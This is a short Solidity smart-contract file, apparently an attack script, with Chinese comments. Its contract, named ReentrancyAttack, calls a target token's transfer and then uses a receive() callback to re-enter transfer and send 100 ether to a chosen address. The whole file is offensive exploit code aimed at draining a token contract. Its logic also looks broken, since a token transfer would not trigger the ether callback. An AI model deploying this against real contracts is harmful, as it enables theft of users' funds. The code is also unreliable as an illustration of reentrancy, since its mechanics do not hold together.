// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IMyToken {
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ReentrancyAttack {
    IMyToken public targetToken;
    address public user;

    constructor(address _targetToken) {
        targetToken = IMyToken(_targetToken);
    }

    // 攻击入口函数
    function attack(address _user, uint256 amount) external {
        user = _user;
        // 向目标合约发起转账
        targetToken.transfer(address(this), amount);
    }

    // 回调函数，利用重入漏洞
     receive() external payable {
        if (user != address(0)) {
            // 重入攻击，转账给用户
            targetToken.transfer(user, 100 ether); // 继续转账
        }
    }
}
